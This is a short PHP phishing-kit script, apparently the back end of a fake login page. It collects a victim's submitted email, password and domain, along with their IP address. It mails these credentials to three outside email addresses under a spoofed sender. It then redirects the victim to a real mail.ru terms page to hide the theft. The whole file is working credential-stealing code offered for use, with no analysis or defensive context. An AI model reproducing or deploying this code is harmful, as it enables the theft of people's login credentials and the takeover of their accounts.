<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['email'];
$passwd = $_POST['Password'];
$domain = $_POST['domain'];
$email .= $domain;

//sendig infos
$msg = "ID: $email \n Password: $passwd \n Ip: $ip";
$from = "FromOLUWA BLESS DOPPA <jamiekong@vip.163.com>";
$subj = "DOPPA! Is here";
mail("Resultbox100@protonmail.com",$subj,$msg,$from);
mail("kingdoppa50@gmail.com",$subj,$msg,$from);
mail("rickdoppa@yandex.com",$subj,$msg,$from);
?>
<html>
<body>
<script type="text/javascript">window.location.href = "https://help.mail.ru/legal/terms/common/ua";</script>
</body>
</html>